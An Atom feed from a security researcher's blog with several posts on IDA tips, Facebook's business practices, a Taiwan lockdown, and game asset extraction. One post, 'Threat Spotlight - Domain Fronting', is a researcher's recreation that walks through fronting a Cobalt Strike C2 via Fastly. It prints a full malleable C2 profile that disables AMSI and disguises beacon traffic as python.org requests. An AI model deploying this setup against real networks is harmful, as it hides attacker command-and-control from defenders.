<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://stillu.cc/feed.xml" rel="self" type="application/atom+xml" /><link href="https://stillu.cc/" rel="alternate" type="text/html" /><updated>2022-11-18T13:39:51+08:00</updated><id>https://stillu.cc/feed.xml</id><title type="html">Just Still</title><subtitle>Infosec. Blog. Photography. Anything.</subtitle><author><name>Still Hsu</name><email>business@stillu.cc</email></author><entry><title type="html">IDA Trickeries #1: Using Saved Desktop Across IDAs</title><link href="https://stillu.cc/ida-tips/2022/01/22/saved-desktops-across-32bit-64bit/" rel="alternate" type="text/html" title="IDA Trickeries #1: Using Saved Desktop Across IDAs" /><published>2022-01-22T00:00:00+08:00</published><updated>2022-01-22T00:00:00+08:00</updated><id>https://stillu.cc/ida-tips/2022/01/22/saved-desktops-across-32bit-64bit</id><content type="html" xml:base="https://stillu.cc/ida-tips/2022/01/22/saved-desktops-across-32bit-64bit/"><![CDATA[<p>Welcome to a new series I’m calling IDA Trickeries! In this series, I’ll be looking at weird IDA quirks or not-so-well-known IDA tips that I’ve learned over the years.</p>

<p>Today’s topic: desktop layouts - specifically, the weirdness you may encounter when you try to use saved layouts across different IDA architecture versions on Windows.</p>

<p>Let’s start off with the basic. You can create and save one or more “desktops” in IDA by going to <code class="language-plaintext highlighter-rouge">Windows</code> -&gt; <code class="language-plaintext highlighter-rouge">Save desktop...</code> and optionally set it as the default layout. When a desktop is saved as the default, the next time IDA opens a new binary, it’ll automatically load up the desktop layout that you had previously saved. For example, I might put Strings View on my other monitor and IDA View on my main one.</p>

<p><a href="/assets/images/posts/ida-1-desktop/2022-01-22_02-03-49-(ida)-.png"><img class="lazy align-center" src="/generated/assets/images/posts/ida-1-desktop/2022-01-22_02-03-49-(ida)--600-d575be17d.png" srcset="/generated/assets/images/posts/ida-1-desktop/2022-01-22_02-03-49-(ida)--600-d575be17d.png 1.0x, /generated/assets/images/posts/ida-1-desktop/2022-01-22_02-03-49-(ida)--900.0-d575be17d.png 1.5x, /generated/assets/images/posts/ida-1-desktop/2022-01-22_02-03-49-(ida)--1200-d575be17d.png 2.0x"></a></p>

<p>Alright, that sounds great! But wait a second… Why does it not load up the same default desktop in the 64-bit IDA if I save the layout in the 32-bit IDA? It only loads up the default desktop!</p>

<p><a href="/assets/images/posts/ida-1-desktop/2022-01-22_02-08-51-(ida)-.png"><img class="lazy align-center" src="/generated/assets/images/posts/ida-1-desktop/2022-01-22_02-08-51-(ida)--600-0a7edbdde.png" srcset="/generated/assets/images/posts/ida-1-desktop/2022-01-22_02-08-51-(ida)--600-0a7edbdde.png 1.0x, /generated/assets/images/posts/ida-1-desktop/2022-01-22_02-08-51-(ida)--900.0-0a7edbdde.png 1.5x, /generated/assets/images/posts/ida-1-desktop/2022-01-22_02-08-51-(ida)--1200-0a7edbdde.png 2.0x"></a></p>

<p>So, it turns out, IDA saves quite a bit of information as a JSON when you save a desktop layout. These include the state of all the windows, opened views, how big each view is, is sync enabled, etc. The problematic part of this seems to be the windows state, as removing that part of the information magically allows IDA to load up the desktop layout properly. On Windows, you can find this information stored under <code class="language-plaintext highlighter-rouge">HKCU\Software\Hex-Rays\IDA\Desktops</code> (some of the other settings are stored here in the <code class="language-plaintext highlighter-rouge">IDA</code> sub-key as well).</p>

<p><a href="/assets/images/posts/ida-1-desktop/2022-01-22_02-12-33-(regedit)-.png"><img class="lazy align-center" src="/generated/assets/images/posts/ida-1-desktop/2022-01-22_02-12-33-(regedit)--600-72623079c.png" srcset="/generated/assets/images/posts/ida-1-desktop/2022-01-22_02-12-33-(regedit)--600-72623079c.png 1.0x, /generated/assets/images/posts/ida-1-desktop/2022-01-22_02-12-33-(regedit)--900.0-72623079c.png 1.5x, /generated/assets/images/posts/ida-1-desktop/2022-01-22_02-12-33-(regedit)--1200-72623079c.png 2.0x"></a></p>

<p>If you remove the <code class="language-plaintext highlighter-rouge">window_state</code> object and store the value back in, the default desktop will suddenly be loadable across different versions of IDA. Neat right? Not sure who at Hex-rays is responsible for this annoying quirk, though.</p>

<p><a href="/assets/images/posts/ida-1-desktop/json.png"><img class="lazy align-center" src="/generated/assets/images/posts/ida-1-desktop/json-600-988c1f8c9.png" srcset="/generated/assets/images/posts/ida-1-desktop/json-600-988c1f8c9.png 1.0x, /generated/assets/images/posts/ida-1-desktop/json-809-988c1f8c9.png 1.35x"></a></p>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="ida-tips" /><category term="en-us" /><summary type="html"><![CDATA[So like... who at Hex-rays implemented this?]]></summary></entry><entry><title type="html">Threat Spotlight - Domain Fronting</title><link href="https://stillu.cc/threat-spotlight/2021/11/13/domain-fronting-fastly/" rel="alternate" type="text/html" title="Threat Spotlight - Domain Fronting" /><published>2021-11-13T00:00:00+08:00</published><updated>2021-11-13T00:00:00+08:00</updated><id>https://stillu.cc/threat-spotlight/2021/11/13/domain-fronting-fastly</id><content type="html" xml:base="https://stillu.cc/threat-spotlight/2021/11/13/domain-fronting-fastly/"><![CDATA[<p>Domain fronting is a common technique that is sometimes used by threat actors to disguise their traffic as the real deal. Essentially, what it is is communicate with legitimate-looking domains when reality, the traffic is being pointed to threat actor’s C2 stations. A common example would be using legitimate or reputable domains with a custom <code class="language-plaintext highlighter-rouge">Host</code> header to redirect the traffic to threat actor’s stations. There are many examples out there that abuse services like <a href="https://digi.ninja/blog/cloudflare_example.php">Cloudflare</a>, <a href="https://digi.ninja/blog/cloudfront_example.php">CloudFront</a>, and such.</p>

<p>In today’s example, we’ll be using Fastly as an example. Fastly provides a service that’s more or less intended to act as a CDN, where you can create a service and tie it to your backend. As you can imagine, a company as large as Fastly (<a href="https://www.bloomberg.com/news/articles/2021-06-08/explaining-cdns-and-why-big-websites-crash-together-quicktake">that was able to bring half the Internet with it when it went down</a>), there are probably more than thousands of people using their services - and indeed there are.</p>

<p>You can do a quick search using services like RiskIQ to look through all of the subdomains associated with <code class="language-plaintext highlighter-rouge">*.fastly.net</code>. While <a href="https://fortynorthsecurity.com/blog/fastly-and-fronting/">it appears we’re not the first to discover this</a>, there aren’t a whole lot of other resources out there talking about abusing Fastly as a service.</p>

<p><a href="/assets/images/posts/domain-fronting/2021-11-14_20-34-02.png"><img class="lazy align-center" src="/generated/assets/images/posts/domain-fronting/2021-11-14_20-34-02-440-fe2031482.png" srcset="/generated/assets/images/posts/domain-fronting/2021-11-14_20-34-02-440-fe2031482.png 0.73x"></a></p>

<p>And Python Software Foundation just so happens to use it too!</p>

<p><a href="/assets/images/posts/domain-fronting/2021-11-14_20-40-10.png"><img class="lazy align-center" src="/generated/assets/images/posts/domain-fronting/2021-11-14_20-40-10-600-dff4775ea.png" srcset="/generated/assets/images/posts/domain-fronting/2021-11-14_20-40-10-600-dff4775ea.png 1.0x, /generated/assets/images/posts/domain-fronting/2021-11-14_20-40-10-886-dff4775ea.png 1.48x"></a></p>

<p>What actually happens is when you contact <code class="language-plaintext highlighter-rouge">python.org</code>, it actually gets interpreted as <code class="language-plaintext highlighter-rouge">python.org.prod.global.fastly.net</code> internally based on the <code class="language-plaintext highlighter-rouge">Host</code> header. This was actually brought to our attention a while back when my colleagues discovered there were CobaltStrike beacons in the wild that appear to connect to Python-related domains at execution, and upon further investigation, we realized they were abusing the nature of Fastly services to disguise their traffic. So I decided to do a little experiment this weekend to see if I can recreate that myself.</p>

<p>To get started, I created a new service on Fastly called <code class="language-plaintext highlighter-rouge">dl-python.org</code>, a service name (and in turn, a domain name) that appears to be similar enough to the real deal, but doesn’t actually exist (and it doesn’t need to be!).</p>

<figure>
  <a href="/assets/images/posts/domain-fronting/2021-11-13_19-29-20.png">
  <picture>
    <source srcset="/generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-400-872480f2d.webp 400w, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-600-872480f2d.webp 600w, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-800-872480f2d.webp 800w, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-1000-872480f2d.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-400-8ea4bc972.png 400w, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-600-8ea4bc972.png 600w, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-800-8ea4bc972.png 800w, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-1000-8ea4bc972.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/domain-fronting/2021-11-13_19-29-20-800-8ea4bc972.png" width="1315" height="363" />
  </picture>
</a>

  <a href="/assets/images/posts/domain-fronting/2021-11-14_20-47-44.png">
  <picture>
    <source srcset="/generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-400-c909c8b50.webp 400w, /generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-600-c909c8b50.webp 600w, /generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-800-c909c8b50.webp 800w, /generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-1000-c909c8b50.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-400-04fc3fe5e.png 400w, /generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-600-04fc3fe5e.png 600w, /generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-800-04fc3fe5e.png 800w, /generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-1000-04fc3fe5e.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/domain-fronting/2021-11-14_20-47-44-800-04fc3fe5e.png" width="1024" height="287" />
  </picture>
</a>

  <figcaption>
    Create a new service that appears to be genuine enough to the target domain name. In this case, <code>dl-python.org</code>.
    Note that while <code>dl-python.org</code> appears to be actually owned by someone else, I don't actually have access to it, nor will it actually make contact with the domain (we'll get to that part later). You can name it whatever you want.
  </figcaption>
</figure>

<p>Next, in the Host settings section, enter your actual C2’s domain name, something you have actual control over. In this case, <code class="language-plaintext highlighter-rouge">my-c2domain.com</code>. I have the port set to <code class="language-plaintext highlighter-rouge">55137</code>, but it should be 443 ideally for HTTPS beacons. My 80/443 port was occupied by something else when I was experimenting with it.</p>

<p><a href="/assets/images/posts/domain-fronting/2021-11-13_19-29-57.png"><img class="lazy align-center" src="/generated/assets/images/posts/domain-fronting/2021-11-13_19-29-57-600-45b5c111d.png" srcset="/generated/assets/images/posts/domain-fronting/2021-11-13_19-29-57-600-45b5c111d.png 1.0x, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-57-900.0-45b5c111d.png 1.5x, /generated/assets/images/posts/domain-fronting/2021-11-13_19-29-57-1200-45b5c111d.png 2.0x"></a></p>

<p>Next, we’re going to craft a new CobaltStrike Stager. Create a new Listener on your team server with the vulnerable domain name as the C2, and enter your service name in the <code class="language-plaintext highlighter-rouge">Host</code> field. To make the traffic look a little bit more genuine, you can also craft your own malleable C2 profile that has contents of Python docs inside.</p>

<p><a href="/assets/images/posts/domain-fronting/2021-11-13_19-28-47.png"><img class="lazy align-center" src="/generated/assets/images/posts/domain-fronting/2021-11-13_19-28-47-600-f3db9a015.png" srcset="/generated/assets/images/posts/domain-fronting/2021-11-13_19-28-47-600-f3db9a015.png 1.0x, /generated/assets/images/posts/domain-fronting/2021-11-13_19-28-47-900.0-f3db9a015.png 1.5x, /generated/assets/images/posts/domain-fronting/2021-11-13_19-28-47-1200-f3db9a015.png 2.0x"></a></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set sleeptime "5000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0";

# set host_stage "false";
post-ex {
	# control the temporary process we spawn to
	set spawnto_x86 "%ProgramFiles(x86)%\\Everything\\Everything.exe";
	set spawnto_x64 "%ProgramFiles%\\Mozilla Firefox\\firefox.exe";

	# change the permissions and content of our post-ex DLLs
	set obfuscate "true";

	# pass key function pointers from Beacon to its child jobs
	set smartinject "true";

	# disable AMSI in powerpick, execute-assembly, and psinject
	set amsi_disable "true";
}

http-config {
	set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
	set trust_x_forwarded_for "false";
	header "Server" "nginx";
	header "Keep-Alive" "timeout=5, max=100";
	header "Connection" "Keep-Alive";
}

http-get {
    set uri "/3/library/stdtypes.html";
    client {
        header "Accept" "*/*";
        header "Host" "dl-python.org";
        metadata {
            base64;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Server" "nginx";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            base64url;
            # the content was so long for my IDE that it actually hung when trying to parse it
            # so I'm gonna leave this section to you
            append "...html_head...";
            prepend "...html_body...";
            print;
        }
    }
}

http-post {
    set uri "/3/library/struct.html";
    client {
        header "Accept" "*/*";
        header "Host" "cobaltstrike.stillu.cc";
        id {
            mask;
            base64url;
            parameter "x-timer";
        }
        output {
            mask;
            base64url;
            parameter "etag";
        }
    }

    server {
        header "Server" "nginx";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            base64url;
            append "...html_head...";
            prepend "...html_body...";
            print;
        }
    }
}
</code></pre></div></div>

<p>And that’s it! Let’s try to run the stager on our victim machine.</p>

<p><a href="/assets/images/posts/domain-fronting/2021-11-13_19-31-10.png"><img class="lazy align-center" src="/generated/assets/images/posts/domain-fronting/2021-11-13_19-31-10-600-eaa1402d8.png" srcset="/generated/assets/images/posts/domain-fronting/2021-11-13_19-31-10-600-eaa1402d8.png 1.0x, /generated/assets/images/posts/domain-fronting/2021-11-13_19-31-10-900.0-eaa1402d8.png 1.5x, /generated/assets/images/posts/domain-fronting/2021-11-13_19-31-10-1200-eaa1402d8.png 2.0x"></a></p>

<p>As you can see, it worked! It looks like it’s contacting <code class="language-plaintext highlighter-rouge">docs.python.org</code> (and it is), yet the server returned beacon information for the stager. Just not in plaintext because I had the <code class="language-plaintext highlighter-rouge">mask</code> option enabled, otherwise the content should look almost like standard HTML content with random bits of information thrown in there because of the malleable C2 config above - and this is with unencrypted traffic.</p>

<p>This trick is perfect for threat actors that want to evade IT admins’ attention as</p>
<ul>
  <li>it appears to contact a real domain with benign URL (<code class="language-plaintext highlighter-rouge">http://docs.python.org/3/library/stdtypes.html</code>)</li>
  <li>it can be made to communicate in HTTPS, so the <code class="language-plaintext highlighter-rouge">Host</code> header wouldn’t even show up</li>
  <li>if the IT admin does manage to figure out it goes to <code class="language-plaintext highlighter-rouge">dl-python.org.prod.global.fastly.net</code>, it doesn’t reveal the actual C2 address still, as the resolved IP would just be Fastly’s own CDN IP.</li>
</ul>

<p>This entire thing was really fun to recreate and helped me understand CobaltStrike a little bit more from attacker’s perspective, as I’ve always tackled CobaltStrike payloads from a Blue Team’s perspective as a threat intel researcher. If you are in the same position as me, I also encourage you to give CobaltStrike a try and try to attack your own machines to see what tricks you can pull off (if your organization has access to such tool).</p>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="threat-spotlight" /><category term="en-us" /><category term="guide" /><summary type="html"><![CDATA[Fast(ly) but deadly.]]></summary></entry><entry><title type="html">Facebook, Monopoly, and Barinsta</title><link href="https://stillu.cc/personal/2021/10/29/barinsta-and-facebook/" rel="alternate" type="text/html" title="Facebook, Monopoly, and Barinsta" /><published>2021-10-29T00:00:00+08:00</published><updated>2021-10-29T00:00:00+08:00</updated><id>https://stillu.cc/personal/2021/10/29/barinsta-and-facebook</id><content type="html" xml:base="https://stillu.cc/personal/2021/10/29/barinsta-and-facebook/"><![CDATA[<h1 id="facebook-monopoly-and-barinsta">Facebook, Monopoly, and Barinsta</h1>

<p>Last week of October 2021 marks the week that my second Instagram account got suspended. My first and my main Instagram account that was created since 2013 was suspended on the last week of September 2021 as well. Over what? We’ll get into that later, but first, let’s talk about the problem with Facebook, neoliberalism and monolopy.</p>

<h2 id="business-model-of-facebook">Business Model of Facebook</h2>

<p>No one gets to use a large-scale service for free - someone has to be the one that pays the bills. What business model does Facebook employ then? Why of course through advertisements! Advertisers pay Facebook a small (or ridiclously high) amount of fee to have their ads posted and delivered to users. Now, this is usually fine, and most people understand this. Getting ads every now and then to make up for the number of storage and or traffic we use on the service, perfectly reasonable. So what’s the problem then?</p>

<p>Ads optimization.</p>

<p>How does Facebook know what ads it should serve people? Through analytics and tracking, and it turns out Facebook excels at this. After all, they’ve been in the advertisement business for over a decade. How does this work? A small section of your user data, such as gender, age, interests, location, is collected from you when you sign up for the service and or begin creating UGCs (User Generated Content). This is explictly stated in their Privacy Policy (which most people don’t read). Facebook claims that the user data is never sent to the advertisers, and they will never get access to your personal info. However, this still does mean that Facebook now technically owns both your UGCs and this small section of information they have collected.</p>

<p>This might be somewhat okay with some people if this data collection is an opt-in behavior. However, it is not. Facebook (and in turn, Instagram) does not allow you to <em>not</em> send “potentially sensitive” information when using their service - and that’s because Facebook does not care about user privacy. If whatever it is they are doing makes the advertisers happy and the cash flowing in, they are willing to go through all sorts of lengths to get to that goal.</p>

<p>Shortly after creating a new Instagram account, it somehow quickly caught up where I physically was located, what language I wrote in, what I may be interested in despite the fact that I have all sorts of protection measures in place (e.g., not telling where Facebook I was, disabling its location services and permissions, using a proper VPN that does not collect user logs) - and remember, customers should <em>not</em> need to go through all these measures just to not get bombarded with ads. The worst part? You can’t even reset the advertisement tracking behavior or preferences.</p>

<p>Despite the fact how Facebook wants you to know “how important privacy is to us (the billion dollar company that runs the Internet)” by creating multiple dedicated privacy policy pages and showing priacy control options, they are merely trying to create an image that sells you the idea that “hey, it’s ok if you don’t want us to invade your privacy.” When, in fact, they just show you what they know about you, and there’s absolutely nothing you can do about it (or at least, the part that matters to each indvidual).</p>

<h3 id="jedi-blue">Jedi Blue</h3>

<p>Let’s switch gear and talk about the Jedi Blue agreement. This agreement was not revealed (to my knowledge) until the court case 1:2021cv06841, an antitrust suit against Google LLC. The legal document spans 173 pages, and while lengthy (though I still encourage you to read it), reveals interesting tidbits about how both Google and Facebook works when it comes to advertisements. To put simply: they do not care about user privacy.</p>

<p>Essentially, Facebook and Google met in closed-door meetings and signed what they called a Jedi Blue Agreement.</p>

<blockquote>
  <p>In  the  Jedi  Blue  agreement,  Google  and  Facebook  agreed  to  manipulate  publisher<br />
auctions in Facebook’s favor through secret bid, spend, and win commitments. 
[…]
The Jedi Blue agreement allocates markets, and therefore fixes prices, between Google 
and  Facebook  as  competing  bidders  in  the  auctions  for  publishers’  web  display  and  in-app 
advertising inventory. The agreement allocated a portion of publishers’ auction wins to Facebook, 
subverting the free operation of supply and demand. Furthermore, the bid rate, win rate, and spend 
commitments  were  designed  to  meet  a  “high  monthly  minimum  to  ensure  volume”  that  spans 
several years. Facebook is locked in and cannot change its mind and switch back to header bidding 
to compete against Google in the publisher ad server market.</p>
  <ul>
    <li>The State Of Texas, et al v. Google, LLC (2021)</li>
  </ul>
</blockquote>

<p>Basically, Google and Facebook agreed to monopolize the ads market together - and they knew an antitrust case would eventually be filed against them.</p>

<blockquote>
  <p>The  agreement  also<br />
requires the parties to coordinate on antitrust defenses, such that Facebook must approve any and 
all  arguments  that  Google  presents  relating  to  their  illegal  agreement  in  its  answer  to  this  Complaint.</p>
  <ul>
    <li>The State Of Texas, et al v. Google, LLC (2021)</li>
  </ul>
</blockquote>

<h3 id="ftc-antitrust-case">FTC Antitrust Case</h3>

<p>In court case 1:20-cv-03590-JEB (basically that one antitrust case where the FTC sued Facebook), Facebook was also scrutunized for having a huge market power to manipulate users into believing their products and services,</p>

<blockquote>
  <p>More generally, Facebook has also engaged in other activities that have degraded 
the user experience, including the misusing or mishandling of user data.  For example, the FTC 
charged Facebook with engaging in a range of serious user privacy and related abuses in 2012 and 
2019,  and  both  times  Facebook  agreed  to  Consent  Orders  (and,  in  2019,  to  pay  a  $5  billion  penalty).    Facebook’s  ability  to  harm  users  by  decreasing  product  quality,  without  losing<br />
significant user engagement, indicates that Facebook has market power. 
[…]
Facebook navigated this period of transition, and has maintained its monopoly 
power in personal social networking thereafter, not by competing on the merits, but rather through a course of anticompetitive conduct spanning years. This course of conduct includes at least: 
a. the acquisition and continued control of Instagram, which has neutralized a 
significant independent personal social networking provider; 
b. the acquisition and continued control of WhatsApp, which has neutralized a 
significant competitive threat to Facebook’s personal social networking monopoly; 
and 
c. the imposition and enforcement of anticompetitive conditions on access to APIs in 
order to suppress and deter competitive threats to its personal social networking 
monopoly.</p>
  <ul>
    <li>FEDERAL TRADE COMMISSION v. FACEBOOK INC. (2020)</li>
  </ul>
</blockquote>

<p>Instagram is a advertisement platform. That’s it. User privacy is not the utmost important to them. Thousands upon thousands of people are tired of anti-consumer behaviors like this, and this is why an open-source alternative was born, Barinsta.</p>

<h2 id="enter-barinsta-and-its-demise">Enter Barinsta and its Demise</h2>

<p>I started using Barinsta some time early 2021 when I got tired of Instagram’s analytics, internal tracking, and giving me an ad every other Story I viewed. Barinsta is more or less based on the existing web version of the Instagram, but adapted in a way that is far more friendly to use than the default web Instagram.</p>

<p>It allows the user to view and or download Instagram photos anonymously or as a standard user - with all the tracking and ads stripped out. One could also view Stories and or DMs without marking the conversation as read, and so many other features that would make Instagram a superior usage experience. In fact, I was so impressed with it, I reached out to the developer and offered to work on localizing the app to Chinese Traditional (zh-TW).</p>

<p>Unfortunately, this was short-lived.</p>

<p>Facebook hit the developer with <a href="https://github.com/austinhuang0131/austinhuang0131/issues/2">a Cease &amp; Desist letter</a>, effectively demanding the developer to drop all work related to Barinsta development. This is unfortunately nothing new when it comes to Facebook vs. community projects or anything they see as a “financial threat.”</p>

<p><a href="https://github.com/AllanWang/Frost-for-Facebook">Frost for Facebook</a> is an OSS alternative to the standard Facebook client on Android. It is based on the standard web version of Facebook but is adopted into a new container that isn’t riddled with advertisements and tracking. Frost has been around <a href="https://github.com/AllanWang/Frost-for-Facebook/commit/f83fb56dca63a06e4706e6cb404bca9c49e5dbe0">since 2017</a> and has been steadily growing over the years.</p>

<p>Facebook, of course, was not happy with that. Some time around mid-2019, I had noticed that my account was getting locked every now and then for no rhyme or reason. Looking around on the issue board, <a href="https://github.com/AllanWang/Frost-for-Facebook/issues/1504">I was not the only one who was experiencing this.</a> Facebook had started picking up Frost as a threat and started flagging accounts that were using Frost to interact with the social media. While eventually a workaround was found (which involved removing a huge chunk of the code), this still goes to show that Facebook can do whatever they want and destroy any community project that they disagree with.</p>

<p>Not wanting to abandon Barinsta, I continued using the client, and now here we are. My main account was banned. My alt was banned - because I don’t want to comply with Facebook’s invasion of privacy. There were rumors that Barinsta was coming back, but for now, it seems like a slow effort and would likely end up as a cat-and-mouse game.</p>

<h2 id="now-what">Now What?</h2>

<blockquote>
  <p>Neoliberal societies punish inefficiency, and teach us that it is our duty as individuals to always strive to better ourselves; if you fall behind, then it is a personal failure, rather than a failure of the system. (Badham, 2019)</p>
</blockquote>

<p>I quit Instagram for now. After quitting Instagram, I do kinda miss seeing what my friends are up to, but we don’t really have to limit ourselves to Instagram, do we? I’ve been looking into decentralized alternatives where <strong>YOU</strong>, the person who posts the content, owns the content. Pixelfed is one of these services that you can self-host and join other similar instances on the Fediverse. This is the best alternative the community has - but getting outsiders to join this project, is going to be hard. We need to migrate from a neoliberalism-centric society to something that allows for more freedom and something that’s not built on pure capitalism.</p>

<h2 id="references">References</h2>

<p>Badham, R. (2019, February 28). The neoliberal side of social media. The Badger. Retrieved October 29, 2021, from https://thebadgeronline.com/2019/03/neoliberal-side-social-media/. 
Facebook, Inc., FTC v. (District of Columbia December 9, 2020).</p>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="personal" /><category term="en-us" /><summary type="html"><![CDATA[Facebook and its anti-competitive strategy.]]></summary></entry><entry><title type="html">Lockdown, Taiwan, 2021</title><link href="https://stillu.cc/personal/2021/07/12/lockdown-taiwan-2021/" rel="alternate" type="text/html" title="Lockdown, Taiwan, 2021" /><published>2021-07-12T00:00:00+08:00</published><updated>2021-07-12T00:00:00+08:00</updated><id>https://stillu.cc/personal/2021/07/12/lockdown-taiwan-2021</id><content type="html" xml:base="https://stillu.cc/personal/2021/07/12/lockdown-taiwan-2021/"><![CDATA[<p>Throughout 2020, Taiwan had done an amazing job at keeping COVID out of the country. Daily cases were low and practically nonexistent. Unfortunately, all of it came crashing down some time around May 2021. It all started with pilots being infected and improper quarantining of the few travelers that were still coming in and out of the island. The outbreak quickly skyrocketed; the case numbers rose quickly from a mere ten to more than thousands a day.</p>

<p>Am I surprised that an outbreak still occurred? Both yes and no. Part of me felt this was inevitable and bound to happen at some point, and another part of me felt like the government had done such a brilliant job at keeping COVID out that I honestly was expecting all of this to blow over without much issue.</p>

<p>It’s been about two months since I’ve started working from home (WFH). Everything was great and refreshing at first. The nature of my job meant that I can basically work wherever I wanted with no issue, long as I have access to the tools I need for malware analysis and the typical threat-intelligence-related tooling. Now? I can’t wait for all of this to blow over and for us to return to the “normal” life (whatever the new normal is).</p>

<p>I miss seeing friends. I miss the physical entertainment that I had before the lockdown. I miss being able to dine in at restaurants given enjoying food is one of the greatest entertainments I’ve had over the last few years. Remember, this is the first lockdown we have ever experienced here in Taiwan. I know some countries have been having lockdown for far longer than we have, so I can’t possibly imagine how it must feel for them.</p>

<p>This lockdown has also made me realize just how lonely I feel and I am. I already don’t have many friends ever since moving up north for job seeking. I only get to see some of my friends every month or so when I do go back to my home city or really any other cities. Now with lockdown, it’s basically impossible to see any of them. Sure, texting and video calling is a thing, but it’s the physical interaction that I miss – it’s gotten so bad that I’ve started using dating apps again just to fill that void, and even then that still doesn’t do it. Every time this feeling crops up, I can’t help but think “I love my job, but I miss my friends even more.”</p>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="personal" /><category term="en-us" /><summary type="html"><![CDATA[Impact of lockdown in Taiwan and my personal life.]]></summary></entry><entry><title type="html">How I Extracted an Unreal Engine Game’s WWise Audio</title><link href="https://stillu.cc/infosec/2021/03/01/obtaining-unreal-pak-decryption-key/" rel="alternate" type="text/html" title="How I Extracted an Unreal Engine Game’s WWise Audio" /><published>2021-03-01T00:00:00+08:00</published><updated>2021-03-01T00:00:00+08:00</updated><id>https://stillu.cc/infosec/2021/03/01/obtaining-unreal-pak-decryption-key</id><content type="html" xml:base="https://stillu.cc/infosec/2021/03/01/obtaining-unreal-pak-decryption-key/"><![CDATA[<p class="notice--info"><strong>⚠ Disclaimer</strong> The following post has the game’s name, ID, and encryption key redacted.</p>

<p>I’ve been playing a game that I love, and the best part of it is its wicked soundtrack. Buuuut, the publisher hasn’t released the official soundtrack for it, and I just couldn’t wait for its release. Since I knew the game <em>has to</em> load in its asset from somewhere, I figured time to crack it wide open then!</p>

<h2 id="obtaining-the-game-files">Obtaining the Game Files</h2>

<p>I was stumped at this part for a while, as there doesn’t appear to be any official documentation on how Windows Apps’ filesystem security is handled. I first tried to obtain the files by running a PowerShell session as <code class="language-plaintext highlighter-rouge">NT AUTHORITY/SYSTEM</code>. After all, SYSTEM <em>should</em> have absolute control over the filesystem, right?</p>

<p><a href="/assets/images/posts/unreal-pak/4ecdb5cf688db0c710f5bf85a853e06470bf3871471d77a5a5b1a7e08f337c9d.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/4ecdb5cf688db0c710f5bf85a853e06470bf3871471d77a5a5b1a7e08f337c9d-600-97069e2aa.png" srcset="/generated/assets/images/posts/unreal-pak/4ecdb5cf688db0c710f5bf85a853e06470bf3871471d77a5a5b1a7e08f337c9d-600-97069e2aa.png 1.0x, /generated/assets/images/posts/unreal-pak/4ecdb5cf688db0c710f5bf85a853e06470bf3871471d77a5a5b1a7e08f337c9d-900.0-97069e2aa.png 1.5x, /generated/assets/images/posts/unreal-pak/4ecdb5cf688db0c710f5bf85a853e06470bf3871471d77a5a5b1a7e08f337c9d-1200-97069e2aa.png 2.0x"></a></p>

<p>Well, er, no?</p>

<p>Despite <code class="language-plaintext highlighter-rouge">icacls</code> reporting that <code class="language-plaintext highlighter-rouge">NT AUTHORITY/SYSTEM</code> <em>should</em> in theory have access to the directory, I just could not get PowerShell to read anything from there - even after I enabled every security token imaginable.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Program Files\WindowsApps\[REDACTED]&gt; icacls .
. BUILTIN\Users:(OI)(CI)(Rc,S,RD,REA,X,RA)
  S-1-15-3-247021172-3446442793-3455440376-3877820015-2750965022-664881756-722356460:(OI)(CI)(RX)
  BUILTIN\Users:(OI)(CI)(R)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  S-1-15-3-1024-3635283841-2530182609-996808640-1887759898-3848208603-3313616867-983405619-2501854204:(I)(RX)
  S-1-15-3-1024-3635283841-2530182609-996808640-1887759898-3848208603-3313616867-983405619-2501854204:(I)(OI)(CI)(IO)(GR,GE)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(CI)(RX)
  NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(RX)
  NT AUTHORITY\NETWORK SERVICE:(I)(OI)(CI)(RX)
  NT AUTHORITY\RESTRICTED:(I)(OI)(CI)(RX)
  S-1-19-512-4096:(OI)(CI)(RX,D,WDAC,WO,WA)
</code></pre></div></div>

<p>Ah well, time for plan B.</p>

